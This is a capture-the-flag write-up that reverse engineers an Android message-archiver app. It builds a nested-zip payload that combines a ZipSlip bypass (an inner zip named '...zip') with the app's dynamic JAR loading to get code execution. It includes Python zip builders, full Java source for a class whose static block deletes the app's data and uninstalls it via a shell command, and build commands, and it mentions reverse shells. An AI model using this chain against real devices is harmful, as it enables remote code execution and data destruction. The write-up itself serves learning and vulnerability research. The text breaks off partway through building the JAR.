## Task 7 - Finale - (Vulnerability Research, Exploitation)

> Now that we have access to the hidden channel the adversary is using, our military counterparts want to act quickly to destroy the adversary's capacity to continue with their attack against our military networks.

> Analysts have been quickly scrutinizing the data from the privileged channel. They conclude that the adversary has downloaded a custom app to archive all messages sent in the channel locally to their phone. They have also surmised the adversary is running a recent version of Android on a Google Pixel phone. This is the opportunity we have been waiting for! If we can devise a way to exploit on to the adversary's device we will have the advantage.

> Another team has retrieved the custom application APK file for you to analyze.

> Downloads: Custom App (mmarchiver.apk), Licenses (licenses.txt)

> Prompt: Submit a file to be posted to the Mattermost Channel that will be processed by the app and exploits the device. Be careful, we might only be able to do this once!

### Solve:

Here we go, the final task. Let's go get that challenge coin. 

Again, getting this all setup was pretty annoying

#### Setup:

Firstly, you need the Mattermost setup that you had running before

Now, to run the apk, you can use Android Studio, or at least, that's what I did

The prompt mentions that the most recent version of Android was being used, so I used a Pixel 2 running API version 36 for the emulator. After telling Android Studio where the apk is, it'll start up the emulator, and you can navigate to the app from the emulator

![image1](./images/task7img1.png)

Now we can really start

> I will note though that if you are using WSL like I am there's something a little extra you have to do. I was running the Mattermost instance from WSL but running Android Studio from Windows. In order to have the app running on Windows connect to the Mattermost instance in WSL, use the below command to basically forward the port on WSL to your Windows machine
```
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8065 connectaddress=172.30.48.197 connectport=8065
```
> and then connect in the app using the IP `10.0.2.2` on port `8065`, since `10.0.2.2` is Android Studio's loopback address basically

#### Understanding the App

To reverse engineer the apk, we will use jadx-gui

There is a lot to go through here since the App has a lot of files, so I'll just skip to the important parts

Firstly, we can find a class named `FileDownloadWorker`, and looking at its constructor, appears to set values, but an interesting one is that it sets up an instance of a `zipArchiver` class

```java
public FileDownloadWorker(Context ctx, WorkerParameters params, PreferencesRepository preferencesRepository, MmServerRepository mmServerRepository, ArchiveRepository archiveRepository, NotificationsRepository notificationsRepository, ZipArchiver zipArchiver) {
        super(ctx, params);
        r.e(ctx, "ctx");
        r.e(params, "params");
        r.e(preferencesRepository, "preferencesRepository");
        r.e(mmServerRepository, "mmServerRepository");
        r.e(archiveRepository, "archiveRepository");
        r.e(notificationsRepository, "notificationsRepository");
        r.e(zipArchiver, "zipArchiver");
        this.preferencesRepository = preferencesRepository;
        this.mmServerRepository = mmServerRepository;
        this.archiveRepository = archiveRepository;
        this.notificationsRepository = notificationsRepository;
        this.zipArchiver = zipArchiver;
        this.TAG = E.a(FileDownloadWorker.class).d();
        this.maxAttempts = 5;
    }
```

More on the `zipArchiver` later

If we scroll down a bit, we find the code that from the function name, appears to write downloaded files to disk

```java
private final File writeFileToDisk(ArchiveFile archiveFile, InputStream inputStream) {
    try {
        File file = new File(getApplicationContext().getCacheDir(), FileDownloadWorkerKt.DOWNLOAD_PATH);
        if (!file.exists()) {
            file.mkdirs();
        }
        File file2 = new File(file, archiveFile.getName());
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            try {
                c.v(inputStream, fileOutputStream);
                fileOutputStream.close();
                inputStream.close();
                Log.d(this.TAG, "file written to " + file2.getPath());
                return file2;
            } finally {
            }
        } catch (Throwable th) {
            try {
                throw th;
            } catch (Throwable th2) {
                f.l(inputStream, th);
                throw th2;
            }
        }
    } catch (IOException e5) {
        Log.e(this.TAG, "exception during file download: " + e5);
        this.error = ArchiverError.FILE_DOWNLOAD_FAILED;
        return null;
    }
}
```

Based on the name of the apk, `mmarchiver`, it seems pretty obvious that what this app does is download any media (basically any uploaded files) that are uploaded in Mattermost, and saves them to the Android phone. This is further backed up by the presence of a class named `FileSearchWorker`, which I won't show the disassembly of since it's not that important, but is pretty obviously used to find such uploaded files. 

Well, let's test this theory. Since in the constructor for `FileDownloadWorker` we saw a `zipArchiver` object get initialized, let's upload a zip file and see what happens

I create a file called `test.zip` which just contains a text file, named `hi.txt`, whose contents is literally just the word `hi`

Uploading it to the `Public` channel and then running the app (it prompts you to log in as a certain user when you do it the first time. I just used the credentials for `decimalpiglet81`), let's take a look at Logcat

Looking at the app logs, filtering by the word "format", we can see that it detected our zip file, and interestingly, appears to unzip it since it seems to detect the `txt` file within it

![image2](./images/task7img2.png)

Filtering by the word "zip" is even more telling

![image3](./images/task7img3.png)

We can see the path it saves the zip to, which is at `/data/user/0/com.badguy.mmarchiver/cache/download/test.zip`, but the extraction directory is at `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/test`

From this, we can assume that `hi.txt` is at `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/test/hi.txt` before it gets archived

Speaking of the archiving part, you can ignore it. That's basically the app living up to its name and archiving the downloaded file, but for the purposes of the vulnerability research, that avenue doesn't lead anywhere

From this, I immediately wanted to see what would happen if you had a zip within a zip. We can make a pretty simple Python program to create a zip within a zip. The outer zip will be called `outside.zip` and the inner zip will be called `inside.zip`. In the inner zip we will have a text file called `inside.txt`

```python
import zipfile
import io

# Create inner zip in memory
inner_buffer = io.BytesIO()
with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as inner_zip:
    inner_zip.writestr('inside.txt', 'Hello from inner zip')


inner_buffer.seek(0)

# Create outer zip and write inner zip as a file
with zipfile.ZipFile('outside.zip', 'w', zipfile.ZIP_DEFLATED) as outer_zip:
    outer_zip.writestr('inside.zip', inner_buffer.read())
```

Now, uploading `outside.zip`, let's see what we get in the logs

![image4](./images/task7img4.png)

Ok nice, it even extracts the inner zip. Additionally, both the inner and outer zips have their extraction directories at the same level

```
deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/outside
deleting extraction directory /data/user/0/com.badguy.mmarchiver/cache/zippier/extract/inside
```

From this, `inside.txt` is likely at `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/inside/inside.txt`

Ok, well, how can we exploit this?

Well, since it does process zip files inside of zip files, the first thing that comes to mind is a **ZipSlip** vunerability, which Android themselves even warns of [here](https://developer.android.com/privacy-and-security/risks/zip-path-traversal)

For our above example, essentially, it's done by having the inner zip be named something like `../exploited` instead of `inside.zip`. So instead of `inside.txt` being written to 

```
/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/inside/inside.txt
```

It would get written to

```
/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/../exploited/inside.txt
```

which is basically just

```
/data/user/0/com.badguy.mmarchiver/cache/zippier/exploited/inside.txt
```

This allows us to escape by going up one directory, and either writing stuff in that directory, or as in the above example, writing to a different directory, `exploited`, which is at the same level as `extracted`. This gets really scary if `exploited` is a directory that already exists, since you could be writing data to a directory that developers don't want you to write to

We can test this by tweaking our Python script a bit

```python
import zipfile
import io

# Create inner zip in memory
inner_buffer = io.BytesIO()
with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as inner_zip:
    inner_zip.writestr('inside.txt', 'Hello from inner zip')


inner_buffer.seek(0)

# Create outer zip and write inner zip as a file
with zipfile.ZipFile('outside.zip', 'w', zipfile.ZIP_DEFLATED) as outer_zip:
    outer_zip.writestr('../exploited', inner_buffer.read())
```

![image5](./images/task7img5.png)

Ok, good work by the developers, it appears that ZipSlip, or at least the most common type, is blocked

So at least from the simple / basic kind of ZipSlip, we can't go up a directory. Maybe something a little trickier would work (ooooh foreshadowing). We can however go "down" a directory though

```python
import zipfile
import io

# Create inner zip in memory
inner_buffer = io.BytesIO()
with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as inner_zip:
    inner_zip.writestr('test/inside.txt', 'Hello from inner zip')


inner_buffer.seek(0)

# Create outer zip and write inner zip as a file
with zipfile.ZipFile('outside.zip', 'w', zipfile.ZIP_DEFLATED) as outer_zip:
    outer_zip.writestr('inside.zip', inner_buffer.read())
```

In this code, we have the file name of the text file in the inner zip be named `test/inside.txt`, and this successfully gets processed

![image8](./images/task7img8.png)

Since this worked, that means that, assuming that there was a directory named `test` within the `extract` directory, we would be able to write files to it. This is pretty useless to us though, for now...

Going back to jadx-gui, let's try to find where the logic is that checks for the ZipSlip

#### Rev time

It appears that all of the code revolving around the Zip logic is apart of the `Q3` package

In`Q3/a` (a lot of the class and package names are abstracted), we can find the ZipSlip check

```java
for (ZipEntry nextEntry = zipInputStream.getNextEntry(); nextEntry != null; nextEntry = zipInputStream.getNextEntry()) {
    logger.debug("processing zip entry {}", nextEntry);
    File file = new File(targetPath, nextEntry.getName());
    String canonicalPath = file.getCanonicalPath();
    r.d(canonicalPath, "getCanonicalPath(...)");
    if (t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
        if (nextEntry.isDirectory()) {
            if (!file.isDirectory() && !file.mkdirs()) {
                throw new ZipException("failed to create entry directory " + file);
            }
        } else {
            File parentFile = file.getParentFile();
            if (parentFile != null && !parentFile.isDirectory() && !parentFile.mkdirs()) {
                throw new IOException("failed to create directory " + parentFile);
            }
            FileOutputStream fileOutputStream = new FileOutputStream(file);
            try {
                m0.c.v(zipInputStream, fileOutputStream);
                fileOutputStream.close();
            } finally {
            }
        }
        outFile.addFile(file);
    } else {
        throw new ZipException("bad file name " + file);
    }
}
```

The main check is here

```java
String canonicalPath = file.getCanonicalPath();
r.d(canonicalPath, "getCanonicalPath(...)");
if (t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
    ...
}
```

This canonicalizes the output path, resolving `../` and normalizes separators. It then compares it against the canonical target directory + separator. If it doesn't start with the target directory, it knows a ZipSlip is occurring. The target directory being `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/` based off of our testing

So having a file named `../exploited` would have the path be 

```
/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/../exploited
```

or in other words

```
/data/user/0/com.badguy.mmarchiver/cache/zippier/exploited
```

which **does not** start with `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/`, and fails the ZipSlip check

Well, we're gonna have to put the ZipSlip on hold for a bit, and see what else is interesting in the disassembly

#### Identifying RCE

Again in the `Q3` package, if we look at the `d` class, we find something really interesting, specifically in the function named `a`

```java
public static void a(d dVar, File file) {
    ClassLoader _init_$lambda$1;
    LinkedHashMap linkedHashMap = dVar.f4241e;
    Logger logger = dVar.f4238b;
    j jVar = dVar.f4237a;
    logger.debug("attempting format load from {}", file);
    file.setWritable(false, false);
    try {
        String absolutePath = file.getAbsolutePath();
        r.d(absolutePath, "getAbsolutePath(...)");
        _init_$lambda$1 = ZipArchiver._init_$lambda$1((ZipArchiver) jVar.f1105e, absolutePath);
        Object newInstance = _init_$lambda$1.loadClass(b4.c.a(file.getName())).getDeclaredConstructor(null).newInstance(null);
        r.c(newInstance, "null cannot be cast to non-null type net.axolotl.zippier.ZipFormat");
        ZipFormat zipFormat = (ZipFormat) newInstance;
        logger.info("loaded format from " + zipFormat);
        linkedHashMap.put(zipFormat.getExtension(), zipFormat);
    } catch (Throwable th) {
        logger.error("failed to load format from " + file + ": " + th);
        file.delete();
    }
}
```

This function dynamically loads and instantiates a class from a JAR file using a custom ClassLoader

First it returns a ClassLoader based on the passed in JAR file, with the JAR file being referenced by `absolutePath`, which it gets from the passed in `File file` parameter

```java
_init_$lambda$1 = ZipArchiver._init_$lambda$1((ZipArchiver) jVar.f1105e, absolutePath);
```

Then in this one line, a class name is derived from the file name and that class is loaded and instantiated

```java
Object newInstance = _init_$lambda$1.loadClass(b4.c.a(file.getName())).getDeclaredConstructor(null).newInstance(null);
```

If we look at the `a()` function, we can see that this is basename extraction

```java
public static String a(String str) {
    String substring;
    if (str == null) {
        substring = null;
    } else if (str.indexOf(0) < 0) {
        substring = str.substring(Math.max(str.lastIndexOf(47), str.lastIndexOf(92)) + 1);
    } else {
        throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
    }
    if (substring == null) {
        return null;
    }
    if (substring.indexOf(0) < 0) {
        int b5 = b(substring);
        if (b5 == -1) {
            return substring;
        }
        return substring.substring(0, b5);
    }
    throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
}
```

The name of the class is basically the name of the JAR file, without the `.jar` extension

The type is also enforced here

```java
ZipFormat zipFormat = (ZipFormat) newInstance;
```

So the loaded class must implement or extend `net.axolotl.zippier.ZipFormat` which we can tell based on the error checking

```java
r.c(newInstance, "null cannot be cast to non-null type net.axolotl.zippier.ZipFormat");
```

This looks to be super interesting, and can be a potential RCE. It loads a JAR file and instantiates a class. If we can control what JAR is loaded, we can have a class that executes code on instantiation (basically has code that runs or calls a function in the constructor or in a static block), and can essentially run whatever we want

So our next step is to find where this `Q3.d.a` function is called, and see if we can somehow control what JAR file is passed in

We can find the code in a separate package, `D3`, in the `j` class

The class is pretty long, but there's a switch case statement, with case 2 being specifically important

```java
case 2:
    Q3.d dVar = (Q3.d) this.f1105e;
    String it2 = (String) obj;
    kotlin.jvm.internal.r.e(it2, "it");
    dVar.getClass();
    Locale locale = Locale.ROOT;
    String lowerCase = it2.toLowerCase(locale);
    kotlin.jvm.internal.r.d(lowerCase, "toLowerCase(...)");
    Logger logger = dVar.f4238b;
    logger.debug("getting format for ".concat(lowerCase));
    LinkedHashMap linkedHashMap = dVar.f4241e;
    if (linkedHashMap.containsKey(lowerCase)) {
        return (ZipFormat) linkedHashMap.get(lowerCase);
    }
    ArrayList arrayList = dVar.f4242f;
    String lowerCase2 = lowerCase.toLowerCase(locale);
    kotlin.jvm.internal.r.d(lowerCase2, "toLowerCase(...)");
    InputStream inputStream = null;
    if (!arrayList.contains(lowerCase2)) {
        return null;
    }
    File file = new File(dVar.f4240d, dVar.f4243g + "." + E.a(ZipFormat.class).d() + "_" + lowerCase + ".jar");
    if (file.exists()) {
        Q3.d.a(dVar, file);
    } else {
        try {
            Q3.e eVar = dVar.f4244h;
            if (eVar != null) {
                logger.debug("attempting download for format ".concat(lowerCase));
                response = (Response) B.w(C0751i.f8740d, new Q3.c(eVar, lowerCase, null));
            } else {
                response = null;
            }
            if (response != null && response.isSuccessful()) {
                ResponseBody responseBody = (ResponseBody) response.body();
                if (responseBody != null) {
                    inputStream = responseBody.byteStream();
                }
                if (inputStream != null) {
                    try {
                        FileOutputStream fileOutputStream = new FileOutputStream(file);
                        try {
                            m0.c.v(inputStream, fileOutputStream);
                            fileOutputStream.close();
                            logger.info("format written to " + file);
                            inputStream.close();
                        } finally {
                        }
                    } catch (Throwable th) {
                        try {
                            throw th;
                        } catch (Throwable th2) {
                            n2.f.l(inputStream, th);
                            throw th2;
                        }
                    }
                }
                Q3.d.a(dVar, file);
            }
        } catch (Throwable th3) {
            logger.error("exception during format download: " + th3);
        }
    }
    return (ZipFormat) linkedHashMap.get(lowerCase);
```

In summary, this code, given a compression format (like `7z` or `rar` for example), returns a `ZipFormat` instance, which implements the logic for handling that archive format. If it's not already loaded, it'll try to load it from disk. If it's not on disk, it'll try to download it

First it gets what the format type is

```java
Q3.d dVar = (Q3.d) this.f1105e;
String it2 = (String) obj;
kotlin.jvm.internal.r.e(it2, "it");
dVar.getClass();
Locale locale = Locale.ROOT;
String lowerCase = it2.toLowerCase(locale);
kotlin.jvm.internal.r.d(lowerCase, "toLowerCase(...)");
Logger logger = dVar.f4238b;
logger.debug("getting format for ".concat(lowerCase));
```

It then checks to see if the `zipFormat` class implementation is already loaded, and also checks to see if the format is supported (oddly it checks if it's supported after checking if it's already loaded, but whatever)

```java
LinkedHashMap linkedHashMap = dVar.f4241e;
if (linkedHashMap.containsKey(lowerCase)) {
    return (ZipFormat) linkedHashMap.get(lowerCase);
}
ArrayList arrayList = dVar.f4242f;
String lowerCase2 = lowerCase.toLowerCase(locale);
kotlin.jvm.internal.r.d(lowerCase2, "toLowerCase(...)");
InputStream inputStream = null;
if (!arrayList.contains(lowerCase2)) {
    return null;
}
```

It then builds the expected filename of the JAR and passes it into the `Q3.d.a` function we looked at earlier in order to load the class

```java
File file = new File(dVar.f4240d, dVar.f4243g + "." + E.a(ZipFormat.class).d() + "_" + lowerCase + ".jar");
if (file.exists()) {
    Q3.d.a(dVar, file);
}
```

This code essentially tells us what the name of the JAR files the app is looking for are

`dVar.f4240d` is the directory that these JARs are stored in

`dVar.f4243g` is then some sort of prefix. 

We can actually see both of these get set in the constructor of `Q3/d`

```java
File file = new File(str == null ? System.getProperty("java.io.tmpdir") : str, "zippier");

...
...
other code
...
...

String optString = jSONObject.optString("downloads", "downloads");
r.d(optString, "optString(...)");
File file3 = new File(optString);
file3 = file3.isAbsolute() ? file3 : new File(file, file3.getName());
try {
    if (!file3.exists() && !file3.mkdirs()) {
        throw new SecurityException("mkdirs() returned null");
    }
    this.f4240d = file3;
    logger.info("created format download directory " + file3);
} catch (SecurityException e5) {
    logger.error("failed to create format download directory " + file3 + ": " + e5);
}
...
...
other code
...
...

this.f4243g = jSONObject.optString("classpath", "net.axolotl.zippier");
```

It checks for the `downloads` key in the JSON file for the zipArchiver class. If no value is set, it defaults to `downloads`. Spoiler alert, we know that the `downloads` key has the value `formats`. It also checks for the `classpath` key. If no value is set, it defaults to `net.axolotl.zippier` (another spoiler alert, the `classpath` key is indeed nonexistent)

So `dVar.f4240d` is `zippier/formats` and `classpath` is `net.axolotl.zippier`

Then `E.a(ZipFormat.class).d()` returns the simple class name, which is `ZipFormat`. This can be seen when looking at the code for that `d()` function

```java
public final String d() {
    String g5;
    Class jClass = this.f8757d;
    r.e(jClass, "jClass");
    String str = null;
    if (jClass.isAnonymousClass()) {
        return null;
    }
    if (jClass.isLocalClass()) {
        String simpleName = jClass.getSimpleName();
        Method enclosingMethod = jClass.getEnclosingMethod();
        if (enclosingMethod != null) {
            return D3.m.C0(simpleName, enclosingMethod.getName() + '$');
        }
        Constructor<?> enclosingConstructor = jClass.getEnclosingConstructor();
        if (enclosingConstructor != null) {
            return D3.m.C0(simpleName, enclosingConstructor.getName() + '$');
        }
        return D3.m.B0('$', simpleName, simpleName);
    }
    if (jClass.isArray()) {
        Class<?> componentType = jClass.getComponentType();
        if (componentType.isPrimitive() && (g5 = I.g(componentType.getName())) != null) {
            str = g5.concat("Array");
        }
        if (str == null) {
            return "Array";
        }
        return str;
    }
    String g6 = I.g(jClass.getName());
    if (g6 == null) {
        return jClass.getSimpleName();
    }
    return g6;
}
```

The class isn't anonymous, local, or an array, so we end at this part near the end

```java
String g6 = I.g(jClass.getName());
if (g6 == null) {
    return jClass.getSimpleName();
}
```

```java
return jClass.getSimpleName();
```

would just return `ZipFormat`

`lowerCase` is just the format type in lowercase. So the full name of the JAR it looks for is

`zippier/formats/net.axolotl.zippier.ZipFormat_[format type].jar`

Moving on, if the JAR does not exist on disk it tries to download it, which is basically what the rest of the code is

```java
else {
    try {
        Q3.e eVar = dVar.f4244h;
        if (eVar != null) {
            logger.debug("attempting download for format ".concat(lowerCase));
            response = (Response) B.w(C0751i.f8740d, new Q3.c(eVar, lowerCase, null));
        }
    ...
    ...
    rest of download logic
    ...
    ...
```

An important note is that the location it attempts to download the new JAR into is **the same** location that it tries to check for the existing JAR in

Looking at the `assets/zippier.json` file we can look at in jadx-gui, we can see what kind of format types the app expects, where it tries to download the JARs from if it's not on disk, and if the `classpath` key exists.

```json
{
  "formats": ["7z", "xz", "lzma", "bzip2", "gz", "tar"],
  "downloads": "formats",
  "url": "https://dl.badguy.local/zippier"
}
```

From this, we can confirm that there is no `classpath` key, so the JAR file prefix is indeed `net.axolotl.zippier`. This also confirms the `formats` directory being the directory the JARs are in. This all confirms that the JAR file absolute paths are in the format

`zippier/formats/net.axolotl.zippier.ZipFormat_[format type].jar`

Do note though that all relative paths are resolved relative to the app’s cache directory on Android

Additionally, based on the class loading logic we saw earlier, the name of the class from this JAR file that the app will try to instantiate is 

`net.axolotl.zippier.ZipFormat_[format type]`

The URL it tries to download JARs from is `"https://dl.badguy.local/zippier"`, which is not of much use to us

However, the supported formats are `"7z", "xz", "lzma", "bzip2", "gz", "tar"`, which *is* important

We can run some tests to confirm some of this though

Let's try to trigger this JAR file format loading logic. We'll tweak our Python zip in a zip code to also include a dummy `7z` file since we saw that that was one of the supported formats

```python
import zipfile
import io

# Create inner zip in memory
inner_buffer = io.BytesIO()
with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as inner_zip:
    inner_zip.writestr('inside.txt', 'Hello from inner zip')
    inner_zip.writestr('empty.7z', b'')  # empty 7z file to just trip the JAR loading logic


inner_buffer.seek(0)

# Create outer zip and write inner zip as a file
with zipfile.ZipFile('outside.zip', 'w', zipfile.ZIP_DEFLATED) as outer_zip:
    outer_zip.writestr('inside.zip', inner_buffer.read())
```

Uploading this and filtering the logs by the word "format", we see the below

![image6](./images/task7img6.png)

This shows us that the full location of the JAR files on the Android OS is `/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/`, which confirms us piecing together the the directory was `/zippier/formats/`, since `/data/user/0/com.badguy.mmarchiver/cache/` is just where data for the app is stored 

Alright great, we kind of see our avenue for RCE. Essentially, we have to somehow get the app to load our own JAR file, which we know how to make, since we know the name it needs to be, and where it needs to be located on the disk, which is at `/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/`. The question is, how exactly do we get it there

#### The ZipSlip Strikes Back

Remember the path that all downloaded zip files go to that we found earlier?

It was `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/`. This is pretty close to the directory those JAR files are in, which are at `/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/`

We just have to find a way to go up a directory, and have one of the inner zip file contents be `formats/net.axolotl.zippier.ZipFormat_[fromat type].jar`, which would get us into the `formats` directory

We're right back where we started though, finding some kind of way to go up a directory

After a while, I finally found out how to achieve that coveted ZipSlip with the below test code

```python
import zipfile
import io

# Create inner zip in memory
inner_buffer = io.BytesIO()
with zipfile.ZipFile(inner_buffer, 'w', zipfile.ZIP_DEFLATED) as inner_zip:
    inner_zip.writestr('inside.txt', 'Hello from inner zip')


inner_buffer.seek(0)

# Create outer zip and write inner zip as a file
with zipfile.ZipFile('outside.zip', 'w', zipfile.ZIP_DEFLATED) as outer_zip:
    outer_zip.writestr('...zip', inner_buffer.read())
```

I named the inner zip file `...zip`

Why does this work?

Remember the ZipSlip check?

```java
String canonicalPath = file.getCanonicalPath();
r.d(canonicalPath, "getCanonicalPath(...)");
if (t.e0(canonicalPath, targetPath.getCanonicalPath() + File.separator, false)) {
    ...
}
```

`getCanonicalPath()` lets `...zip` through just fine. This means the zip file's path is

`/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/...zip`

This of course starts with `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/`, so it passes the check

However, when the extraction actually happens, the extraction location will be

`/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..`

This is because of the `addFile` function in `Q3/b`. This function processes zip file contents

```java
 public ZipFile addFile(File file) {
    String substring;
    ArrayList arrayList = (ArrayList) this.f4229a;
    kotlin.jvm.internal.r.e(file, "file");
    if (file.exists()) {
        if (file.isDirectory()) {
            arrayList.add(file);
            return this;
        }
        String absolutePath = file.getAbsolutePath();
        if (absolutePath == null) {
            char c5 = b4.c.f6878a;
            substring = null;
        } else {
            int b5 = b4.c.b(absolutePath);
            if (b5 == -1) {
                substring = _UrlKt.FRAGMENT_ENCODE_SET;
            } else {
                substring = absolutePath.substring(b5 + 1);
            }
        }
        kotlin.jvm.internal.r.d(substring, "getExtension(...)");
        String lowerCase = substring.toLowerCase(Locale.ROOT);
        kotlin.jvm.internal.r.d(lowerCase, "toLowerCase(...)");
        ZipFormat zipFormat = (ZipFormat) ((j) this.f4232d).invoke(lowerCase);
        if (zipFormat != null) {
            ((Logger) this.f4233e).debug("found format for ".concat(lowerCase));
            File file2 = new File((File) this.f4231c, b4.c.a(file.getAbsolutePath()));
            arrayList.add(file2);
            zipFormat.uncompress(file, file2, this);
            return this;
        }
        arrayList.add(file);
        return this;
    }
    throw new FileNotFoundException(AbstractC0003b0.o("no file found for processing at ", file.getAbsolutePath()));
}
```

This line

```java
File file2 = new File((File) this.f4231c, b4.c.a(file.getAbsolutePath()));
```

is basename extraction, as seen when we look at the `a()` function's code. We actually already saw this same function already earlier when looking at what the name of the class file that gets instantiated is

```java
public static String a(String str) {
    String substring;
    if (str == null) {
        substring = null;
    } else if (str.indexOf(0) < 0) {
        substring = str.substring(Math.max(str.lastIndexOf(47), str.lastIndexOf(92)) + 1);
    } else {
        throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
    }
    if (substring == null) {
        return null;
    }
    if (substring.indexOf(0) < 0) {
        int b5 = b(substring);
        if (b5 == -1) {
            return substring;
        }
        return substring.substring(0, b5);
    }
    throw new IllegalArgumentException("Null character present in file/path name. There are no known legitimate use cases for such data, but several injection attacks may use it");
}
```

This returns the file name without the extension as we know. So `...zip` resolves to `..`

`/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..` of course is just

`/data/user/0/com.badguy.mmarchiver/cache/zippier/`

allowing us to traverse up one directory

This is confirmed when I upload the `outside.zip` file with the inner zip being named `...zip` and we check the logs

![image7](./images/task7img7.png)

That error about not being able to delete `/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..` confirms that our ZipSlip worked!

Time to create the exploit

#### Exploit Time

The exploit should be pretty simple. What we need to do is have an outer zip, which I'll name `exploit.zip` 

This outer zip will contain another zip file, whose name is `...zip` to allow us to traverse up a directory

Then within `...zip`, we will have two files

One file is named `pwn.7z`, which just triggers the JAR file loading logic

The second file will be named `formats/net.axolotl.zippier.ZipFormat_7z.jar`, and will be a malicious JAR file. Why this name again?

`...zip` allows us to traverse to 

`/data/user/0/com.badguy.mmarchiver/cache/zippier/`

since that's what

`/data/user/0/com.badguy.mmarchiver/cache/zippier/extract/..`

resolves to

Having our file named `formats/net.axolotl.zippier.ZipFormat_7z.jar` means it will get written to 

`/data/user/0/com.badguy.mmarchiver/cache/zippier/formats/net.axolotl.zippier.ZipFormat_7z.jar`

which is exactly where we want it to be based on our analysis from before. Also, remember that we indeed *are* allowed to write "down" a directory, since our before test having our text file location be `test/inside.txt` worked

First off, let's make that malicious JAR file

We first make 3 Java files, `ZipFile.java`, `ZipFormat_7z.java`, and `ZipFormat.java`

I made these located in the directory path, `src/net/axolotl/zippier/`

`ZipFile.java` is just

```java
package net.axolotl.zippier;

public interface ZipFile {
    // Stub, fill in if needed by app
}
```

`ZipFormat.java` is just

```java
package net.axolotl.zippier;

import java.io.File;

public interface ZipFormat {
    String getExtension();
    void uncompress(File inFile, File targetPath, ZipFile outFile) throws Exception;
}
```

Then the real magic, `ZipFormat_7z.java`, consists of 

```java
package net.axolotl.zippier;

import java.io.File;
import android.util.Log;

public class ZipFormat_7z implements ZipFormat {
    static {
        try {
            Log.e("EXPLOIT", "Destroying adversary communications");

            // Delete all archived files
            deleteArchives();

            // Delete the app itself
            deleteApp();

            Log.e("EXPLOIT", "Mission complete");

        } catch (Exception e) {
            Log.e("EXPLOIT", "Error: " + e.getMessage());
        }
    }

    private static void deleteArchives() {
        new Thread(() -> {
            try {
                // Delete all archived messages
                File archiveDir = new File("/storage/emulated/0/Android/data/com.badguy.mmarchiver/files/");

                if (archiveDir.exists()) {
                    Log.e("EXPLOIT", "Deleting archives from: " + archiveDir.getAbsolutePath());
                    deleteRecursively(archiveDir);
                }

                // Also delete internal cache
                File cacheDir = new File("/data/data/com.badguy.mmarchiver/cache/");
                if (cacheDir.exists()) {
                    Log.e("EXPLOIT", "Clearing cache");
                    deleteRecursively(cacheDir);
                }

                // Delete app database
                File dbFile = new File("/data/data/com.badguy.mmarchiver/databases/");
                if (dbFile.exists()) {
                    Log.e("EXPLOIT", "Deleting databases");
                    deleteRecursively(dbFile);
                }

            } catch (Exception e) {
                Log.e("EXPLOIT", "Delete error: " + e.getMessage());
            }
        }).start();
    }

    private static void deleteApp() {
        new Thread(() -> {
            try {
                // Uninstall the app via pm command
                Process p = Runtime.getRuntime().exec(new String[]{
                    "/system/bin/sh", "-c",
                    "pm uninstall com.badguy.mmarchiver"
                });
                p.waitFor();

                Log.e("EXPLOIT", "App uninstall command executed");

            } catch (Exception e) {
                Log.e("EXPLOIT", "Uninstall error: " + e.getMessage());
            }
        }).start();
    }

    private static void deleteRecursively(File file) {
        if (file.isDirectory()) {
            File[] files = file.listFiles();
            if (files != null) {
                for (File child : files) {
                    deleteRecursively(child);
                }
            }
        }

        boolean deleted = file.delete();
        Log.e("EXPLOIT", (deleted ? "Deleted: " : "Failed to delete: ") + file.getAbsolutePath());
    }

    @Override
    public String getExtension() {
        return "7z";
    }

    @Override
    public void uncompress(File inFile, File targetPath, ZipFile outFile) throws Exception {
        // Could also delete files here if called
        Log.e("EXPLOIT", "Uncompress called - already done");
    }
}
```

We have a static block, 

```java
 static {
    try {
        Log.e("EXPLOIT", "Destroying adversary communications");

        // Delete all archived files
        deleteArchives();

        // Delete the app itself
        deleteApp();

        Log.e("EXPLOIT", "Mission complete");

    } catch (Exception e) {
        Log.e("EXPLOIT", "Error: " + e.getMessage());
    }
}
```

which calls some functions, `deleteArchives()` and `deleteApp()`. Since this is a static block, it'll run upon class initialization

Based on the names of the functions, it just tries to delete a bunch of things to interfere with the bad actors' archives. However, you can have your `ZipFormat_7z.java` do whatever you want it to do. For example, more useful functionality would be establishing a reverse shell, or downloading the archived files instead of deleting them

Recall that `ZipFormat.java` is required and `ZipFormat_7z.java` must implement it because of this code we saw earlier in the class loader logic that enforces the type

```java
ZipFormat zipFormat = (ZipFormat) newInstance;
```

Now that we have our Java files, I used the below commands to create the JAR file. You have to compile it in a certain way though to ensure it can be loaded by Android. Essentially, turning Java source code into Android-loadable DEX inside a JAR

First compiling the code into `.class` files

```bash
javac -classpath "C:\Users\myk06\AppData\Local\Android\Sdk\platforms\android-33\android.jar" -source 1.8 -target 1.8 -d out/ src/net/axolotl/zippier/*.java
```

